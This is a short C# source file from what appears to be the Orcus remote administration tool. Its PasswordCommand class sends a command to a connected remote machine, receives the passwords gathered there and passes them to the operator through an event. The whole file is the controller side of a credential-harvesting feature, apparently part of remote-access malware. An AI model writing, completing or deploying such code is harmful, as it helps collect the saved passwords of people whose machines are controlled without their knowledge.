using System;
using Orcus.Shared.Commands.Password;
using Orcus.Shared.NetSerializer;

namespace Orcus.Administration.App
{
	public class PasswordCommand : Command
	{
		public event EventHandler<PasswordData> PasswordsReceived;

		public override void ResponseReceived(byte[] parameter)
		{
			var data = new Serializer(typeof (PasswordData)).Deserialize<PasswordData>(parameter);
			if (PasswordsReceived != null)
				PasswordsReceived.Invoke (this, data);
		}

		public void GetPasswords()
		{
			ConnectionInfo.SendCommand(this, new byte[0]);
		}

		protected override uint GetId()
		{
			return 12;
		}
	}
}